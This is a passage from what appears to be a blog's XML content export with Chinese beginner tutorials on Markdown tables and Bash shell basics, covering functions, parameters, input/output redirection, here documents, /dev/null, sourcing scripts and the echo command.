| 来分隔不同的单元格，使用 - 来分隔表头和其他行。</p><p>语法格式如下：</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown">|  表头   | 表头  |<br>|  ----  | ----  |<br>| 单元格  | 单元格 |<br>| 单元格  | 单元格 |<br></code></pre></div></td></tr></table></figure><p>以上代码显示结果如下：</p><p><img src="https://www.runoob.com/wp-content/uploads/2019/03/23EACC50-38E0-4284-B99A-6BC22E284BAC.jpg" alt="img"></p><p>对齐方式</p><p><strong>我们可以设置表格的对齐方式：</strong></p><ul><li>-: 设置内容和标题栏居右对齐。</li><li>:- 设置内容和标题栏居左对齐。</li><li>:-: 设置内容和标题栏居中对齐。</li></ul><p>实例如下：</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown">| 左对齐 | 右对齐 | 居中对齐 |<br>| :-----| ----: | :----: |<br>| 单元格 | 单元格 | 单元格 |<br>| 单元格 | 单元格 | 单元格 |<br></code></pre></div></td></tr></table></figure><table><thead><tr><th align="left">左对齐</th><th align="right">右对齐</th><th align="center">居中对齐</th></tr></thead><tbody><tr><td align="left">单元格</td><td align="right">单元格</td><td align="center">单元格</td></tr><tr><td align="left">单元格</td><td align="right">单元格</td><td align="center">单元格</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shell base -4</title>
    <link href="/2021/05/05/Shell/ShellBase/shell%20base%20-4/"/>
    <url>/2021/05/05/Shell/ShellBase/shell%20base%20-4/</url>
    
    <content type="html"><![CDATA[<h2 id="Shell-函数"><a href="#Shell-函数" class="headerlink" title="Shell 函数"></a>Shell 函数</h2><p>linux shell 可以用户定义函数，然后在shell脚本中可以随便调用。</p><p>shell中函数的定义格式如下：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">[ function ] funname [()]<br><br>&#123;<br><br>    action;<br><br>    [return int;]<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p>说明：</p><ul><li>1、可以带function fun()  定义，也可以直接fun() 定义,不带任何参数。</li><li>2、参数返回，可以显示加：return 返回，如果不加，将以最后一条命令运行结果，作为返回值。 return后跟数值n(0-255)</li></ul><p>下面的例子定义了一个函数并进行调用：</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>demoFun()&#123;<br>    echo &quot;这是我的第一个 shell 函数!&quot;<br>&#125;<br>echo &quot;-----函数开始执行-----&quot;<br>demoFun<br>echo &quot;-----函数执行完毕-----&quot;<br></code></pre></div></td></tr></table></figure><p>输出结果：</p><figure class="highlight brainfuck"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs brainfuck">--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">函数开始执行</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><br><span class="hljs-comment">这是我的第一个</span> <span class="hljs-comment">shell</span> <span class="hljs-comment">函数!</span><br>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">函数执行完毕</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><br></code></pre></div></td></tr></table></figure><p>下面定义一个带有return语句的函数：</p><h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>funWithReturn()&#123;<br>    echo &quot;这个函数会对输入的两个数字进行相加运算...&quot;<br>    echo &quot;输入第一个数字: &quot;<br>    read aNum<br>    echo &quot;输入第二个数字: &quot;<br>    read anotherNum<br>    echo &quot;两个数字分别为 $aNum 和 $anotherNum !&quot;<br>    return $(($aNum+$anotherNum))<br>&#125;<br>funWithReturn<br>echo &quot;输入的两个数字之和为 $? !&quot;<br></code></pre></div></td></tr></table></figure><p>输出类似下面：</p><figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">这个函数会对输入的两个数字进行相加运算...<br>输入第一个数字: <br>1<br>输入第二个数字: <br>2<br>两个数字分别为<span class="hljs-number"> 1 </span>和<span class="hljs-number"> 2 </span>!<br>输入的两个数字之和为<span class="hljs-number"> 3 </span>!<br></code></pre></div></td></tr></table></figure><p>函数返回值在调用该函数后通过 $? 来获得。</p><p>注意：</p><ol><li>所有函数在使用前必须定义。这意味着必须将函数放在脚本开始部分，直至shell解释器首次发现它时，才可以使用。调用函数仅使用其函数名即可。</li><li>返回值仅为整型。</li></ol><hr><h3 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h3><p>在Shell中，调用函数时可以向其传递参数。在函数体内部，通过 $n 的形式来获取参数的值，例如，$1表示第一个参数，$2表示第二个参数…</p><p>带参数的函数示例：</p><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>funWithParam()&#123;<br>    echo &quot;第一个参数为 $1 !&quot;<br>    echo &quot;第二个参数为 $2 !&quot;<br>    echo &quot;第十个参数为 $10 !&quot;<br>    echo &quot;第十个参数为 $&#123;10&#125; !&quot;<br>    echo &quot;第十一个参数为 $&#123;11&#125; !&quot;<br>    echo &quot;参数总数有 $# 个!&quot;<br>    echo &quot;作为一个字符串输出所有参数 $* !&quot;<br>&#125;<br>funWithParam 1 2 3 4 5 6 7 8 9 34 73<br></code></pre></div></td></tr></table></figure><p>输出结果：</p><figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">第一个参数为<span class="hljs-number"> 1 </span>!<br>第二个参数为<span class="hljs-number"> 2 </span>!<br>第十个参数为<span class="hljs-number"> 10 </span>!<br>第十个参数为<span class="hljs-number"> 34 </span>!<br>第十一个参数为<span class="hljs-number"> 73 </span>!<br>参数总数有<span class="hljs-number"> 11 </span>个!<br>作为一个字符串输出所有参数<span class="hljs-number"> 1 </span>2<span class="hljs-number"> 3 </span>4<span class="hljs-number"> 5 </span>6<span class="hljs-number"> 7 </span>8<span class="hljs-number"> 9 </span>34<span class="hljs-number"> 73 </span>!<br></code></pre></div></td></tr></table></figure><p>注意，$10 不能获取第十个参数，获取第十个参数需要${10}。当n&gt;=10时，需要使用${n}来获取参数。</p><p>另外，还有几个特殊字符用来处理参数：</p><table><thead><tr><th>参数处理</th><th>说明</th></tr></thead><tbody><tr><td>$#</td><td>传递到脚本或函数的参数个数</td></tr><tr><td>$*</td><td>以一个单字符串显示所有向脚本传递的参数</td></tr><tr><td>$$</td><td>脚本运行的当前进程ID号</td></tr><tr><td>$!</td><td>后台运行的最后一个进程的ID号</td></tr><tr><td>$@</td><td>与$*相同，但是使用时加引号，并在引号中返回每个参数。</td></tr><tr><td>$-</td><td>显示Shell使用的当前选项，与set命令功能相同。</td></tr><tr><td>$?</td><td>显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td></tr></tbody></table><h2 id="Shell-输入-输出重定向"><a href="#Shell-输入-输出重定向" class="headerlink" title="Shell 输入/输出重定向"></a>Shell 输入/输出重定向</h2><p>大多数 UNIX 系统命令从你的终端接受输入并将所产生的输出发送回到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端。</p><p>重定向命令列表如下：</p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>command &gt; file</td><td>将输出重定向到 file。</td></tr><tr><td>command &lt; file</td><td>将输入重定向到 file。</td></tr><tr><td>command &gt;&gt; file</td><td>将输出以追加的方式重定向到 file。</td></tr><tr><td>n &gt; file</td><td>将文件描述符为 n 的文件重定向到 file。</td></tr><tr><td>n &gt;&gt; file</td><td>将文件描述符为 n 的文件以追加的方式重定向到 file。</td></tr><tr><td>n &gt;&amp; m</td><td>将输出文件 m 和 n 合并。</td></tr><tr><td>n &lt;&amp; m</td><td>将输入文件 m 和 n 合并。</td></tr><tr><td>&lt;&lt; tag</td><td>将开始标记 tag 和结束标记 tag 之间的内容作为输入。</td></tr></tbody></table><blockquote><p>需要注意的是文件描述符 0 通常是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）。</p></blockquote><hr><h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><p>重定向一般通过在命令间插入特定的符号来实现。特别的，这些符号的语法如下所示:</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">command1</span> &gt; file<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>上面这个命令执行command1然后将输出的内容存入file1。</p><p>注意任何file1内的已经存在的内容将被新内容替代。如果要将新内容添加在文件末尾，请使用&gt;&gt;操作符。</p><h4 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h4><p>执行下面的 who 命令，它将命令的完整的输出重定向在用户文件中(users):</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>who &gt; users<br></code></pre></div></td></tr></table></figure><p>执行后，并没有在终端输出信息，这是因为输出已被从默认的标准输出设备（终端）重定向到指定的文件。</p><p>你可以使用 cat 命令查看文件内容：</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">$ cat<span class="hljs-built_in"> users</span><br><span class="hljs-built_in"></span>_mbsetupuser<span class="hljs-built_in"> console </span> Oct 31 17:35 <br>tianqixin   <span class="hljs-built_in"> console </span> Oct 31 17:35 <br>tianqixin    ttys000  Dec  1 11:33 <br></code></pre></div></td></tr></table></figure><p>输出重定向会覆盖文件内容，请看下面的例子：</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;练习&quot;</span> &gt; users<br><span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> users<br>练习<br><span class="hljs-variable">$</span><br></code></pre></div></td></tr></table></figure><p>如果不希望文件内容被覆盖，可以使用 &gt;&gt; 追加到文件末尾，例如：</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;练习2&quot;</span> &gt;&gt; users<br><span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> users<br>练习<br>练习<span class="hljs-number">2</span><br><span class="hljs-variable">$</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h3><p>和输出重定向一样，Unix 命令也可以从文件获取输入，语法为：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">command1</span> &lt; file<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>这样，本来需要从键盘获取输入的命令会转移到文件读取内容。</p><p>注意：输出重定向是大于号(&gt;)，输入重定向是小于号(&lt;)。</p><h4 id="实例-4"><a href="#实例-4" class="headerlink" title="实例"></a>实例</h4><p>接着以上实例，我们需要统计 users 文件的行数,执行以下命令：</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>wc -l users<br>       <span class="hljs-number">2</span> users<br></code></pre></div></td></tr></table></figure><p>也可以将输入重定向到 users 文件：</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span> wc -l &lt; users<br>       <span class="hljs-number">2</span> <br></code></pre></div></td></tr></table></figure><p>注意：上面两个例子的结果不同：第一个例子，会输出文件名；第二个不会，因为它仅仅知道从标准输入读取内容。</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">command1 &lt; <span class="hljs-keyword">infile</span> &gt; <span class="hljs-keyword">outfile</span><br></code></pre></div></td></tr></table></figure><p>同时替换输入和输出，执行command1，从文件infile读取内容，然后将输出写入到outfile中。</p><h3 id="重定向深入讲解"><a href="#重定向深入讲解" class="headerlink" title="重定向深入讲解"></a>重定向深入讲解</h3><p>一般情况下，每个 Unix/Linux 命令运行时都会打开三个文件：</p><ul><li>标准输入文件(stdin)：stdin的文件描述符为0，Unix程序默认从stdin读取数据。</li><li>标准输出文件(stdout)：stdout 的文件描述符为1，Unix程序默认向stdout输出数据。</li><li>标准错误文件(stderr)：stderr的文件描述符为2，Unix程序会向stderr流中写入错误信息。</li></ul><p>默认情况下，command &gt; file 将 stdout 重定向到 file，command &lt; file 将stdin 重定向到 file。</p><p>如果希望 stderr 重定向到 file，可以这样写：</p><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">$ <span class="hljs-keyword">command</span> <span class="hljs-number">2</span>&gt;<span class="hljs-keyword">file</span><br></code></pre></div></td></tr></table></figure><p>如果希望 stderr 追加到 file 文件末尾，可以这样写：</p><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">$ <span class="hljs-keyword">command</span> <span class="hljs-number">2</span>&gt;&gt;<span class="hljs-keyword">file</span><br></code></pre></div></td></tr></table></figure><p><strong>2</strong> 表示标准错误文件(stderr)。</p><p>如果希望将 stdout 和 stderr 合并后重定向到 file，可以这样写：</p><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">$ <span class="hljs-keyword">command</span> &gt; <span class="hljs-keyword">file</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><br>或者<br><br>$ <span class="hljs-keyword">command</span> &gt;&gt; <span class="hljs-keyword">file</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>如果希望对 stdin 和 stdout 都重定向，可以这样写：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">command</span> &lt; file1 &gt;file2</span><br></code></pre></div></td></tr></table></figure><p>command 命令将 stdin 重定向到 file1，将 stdout 重定向到 file2。 </p><hr><h3 id="Here-Document"><a href="#Here-Document" class="headerlink" title="Here Document"></a>Here Document</h3><p>Here Document 是 Shell 中的一种特殊的重定向方式，用来将输入重定向到一个交互式 Shell 脚本或程序。 </p><p>它的基本的形式如下：</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh"><span class="hljs-built_in">command</span> &lt;&lt; <span class="hljs-string">delimiter</span><br><span class="hljs-string">    document</span><br><span class="hljs-string">delimiter</span><br></code></pre></div></td></tr></table></figure><p>它的作用是将两个 delimiter 之间的内容(document) 作为输入传递给 command。</p><blockquote><p>注意：</p><ul><li>​        结尾的delimiter 一定要顶格写，前面不能有任何字符，后面也不能有任何字符，包括空格和 tab 缩进。</li><li>​        开始的delimiter前后的空格会被忽略掉。</li></ul></blockquote><h4 id="实例-5"><a href="#实例-5" class="headerlink" title="实例"></a>实例</h4><p>在命令行中通过 wc -l 命令计算 Here Document 的行数：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ wc -l &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">    欢迎来到</span><br><span class="hljs-string">EOF</span><br>1          <span class="hljs-comment"># 输出结果为 1 行</span><br>$<br></code></pre></div></td></tr></table></figure><p>我们也可以将 Here Document 用在脚本中，例如：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>cat &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">欢迎来到</span><br><span class="hljs-string">EOF</span><br></code></pre></div></td></tr></table></figure><p>执行以上脚本，输出结果：</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">欢迎来到<br></code></pre></div></td></tr></table></figure><hr><h3 id="dev-null-文件"><a href="#dev-null-文件" class="headerlink" title="/dev/null 文件"></a>/dev/null 文件</h3><p>如果希望执行某个命令，但又不希望在屏幕上显示输出结果，那么可以将输出重定向到 /dev/null：</p><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade">$ command &gt; <span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></div></td></tr></table></figure><p>/dev/null 是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到。但是 /dev/null 文件非常有用，将命令的输出重定向到它，会起到”禁止输出”的效果。</p><p>如果希望屏蔽 stdout 和 stderr，可以这样写：</p><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade">$ command &gt; <span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><blockquote><p><strong>注意：</strong>0 是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）。</p><p>这里的 <strong>2</strong> 和 <strong>&gt;</strong> 之间不可以有空格，<strong>2&gt;</strong> 是一体的时候才表示错误输出。</p></blockquote><h2 id="Shell-文件包含"><a href="#Shell-文件包含" class="headerlink" title="Shell 文件包含"></a>Shell 文件包含</h2><p>和其他语言一样，Shell 也可以包含外部脚本。这样可以很方便的封装一些公用的代码作为一个独立的文件。</p><p>Shell 文件包含的语法格式如下：</p><figure class="highlight tcl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tcl">. <span class="hljs-keyword">filename</span>   # 注意点号(.)和文件名中间有一空格<br><br>或<br><br><span class="hljs-keyword">source</span> <span class="hljs-keyword">filename</span><br></code></pre></div></td></tr></table></figure><h3 id="实例-6"><a href="#实例-6" class="headerlink" title="实例"></a>实例</h3><p>创建两个 shell 脚本文件。</p><p>test1.sh 代码如下：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>url=&quot;http://www.baidu.com&quot;<br></code></pre></div></td></tr></table></figure><p>test2.sh 代码如下：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">使用 . 号来引用test1.sh 文件</span><br>. ./test1.sh<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 或者使用以下包含文件代码</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">source</span> ./test1.sh</span><br><br>echo &quot;百度官网地址：$url&quot;<br></code></pre></div></td></tr></table></figure><p>接下来，我们为 test2.sh 添加可执行权限并执行：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> chmod +x test2.sh</span> <br><span class="hljs-meta">$</span><span class="bash"> ./test2.sh</span> <br>百度官网地址：http://www.baidu.com<br></code></pre></div></td></tr></table></figure><blockquote><p><strong>注</strong>：被包含的文件 test1.sh 不需要可执行权限。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Shell Shell Base</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shell base -3</title>
    <link href="/2021/05/05/Shell/ShellBase/shell%20base%20-3/"/>
    <url>/2021/05/05/Shell/ShellBase/shell%20base%20-3/</url>
    
    <content type="html"><![CDATA[<h2 id="Shell-echo命令"><a href="#Shell-echo命令" class="headerlink" title="Shell echo命令"></a>Shell echo命令</h2><p>Shell 的 echo 指令与 PHP 的 echo 指令类似，都是用于字符串的输出。命令格式：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">echo string<br></code></pre></div></td></tr></table></figure><p>您可以使用echo实现更复杂的输出格式控制。</p><h3 id="1-显示普通字符串"><a href="#1-显示普通字符串" class="headerlink" title="1.显示普通字符串:"></a>1.显示普通字符串:</h3><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">echo &quot;It is a test&quot;<br></code></pre></div></td></tr></table></figure><p>这里的双引号完全可以省略，以下命令与上面实例效果一致：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">echo It is a test<br></code></pre></div></td></tr></table></figure><h3 id="2-显示转义字符"><a href="#2-显示转义字符" class="headerlink" title="2.显示转义字符"></a>2.显示转义字符</h3><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">echo &quot;\&quot;It is a test\&quot;&quot;<br></code></pre></div></td></tr></table></figure><p>结果将是:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">&quot;It is a test&quot;<br></code></pre></div></td></tr></table></figure><p>同样，双引号也可以省略</p><h3 id="3-显示变量"><a href="#3-显示变量" class="headerlink" title="3.显示变量"></a>3.显示变量</h3><p>read 命令从标准输入中读取一行,并把输入行的每个字段的值指定给 shell 变量</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br>read name <br>echo &quot;$name It is a test&quot;<br></code></pre></div></td></tr></table></figure><p>以上代码保存为 test.sh，name 接收标准输入的变量，结果将是: </p><figure class="highlight coffeescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coffeescript">[root@www ~]<span class="hljs-comment"># sh test.sh</span><br>OK                     <span class="hljs-comment">#标准输入</span><br>OK It <span class="hljs-keyword">is</span> a test        <span class="hljs-comment">#输出</span><br></code></pre></div></td></tr></table></figure><h3 id="4-显示换行"><a href="#4-显示换行" class="headerlink" title="4.显示换行"></a>4.显示换行</h3><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">echo -e &quot;OK! \n&quot; # -e 开启转义<br>echo &quot;It is a test&quot;<br></code></pre></div></td></tr></table></figure><p>输出结果：</p><figure class="highlight actionscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs actionscript">OK!<br><br>It <span class="hljs-keyword">is</span> a test<br></code></pre></div></td></tr></table></figure><h3 id="5-显示不换行"><a href="#5-显示不换行" class="headerlink" title="5.显示不换行"></a>5.显示不换行</h3><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span 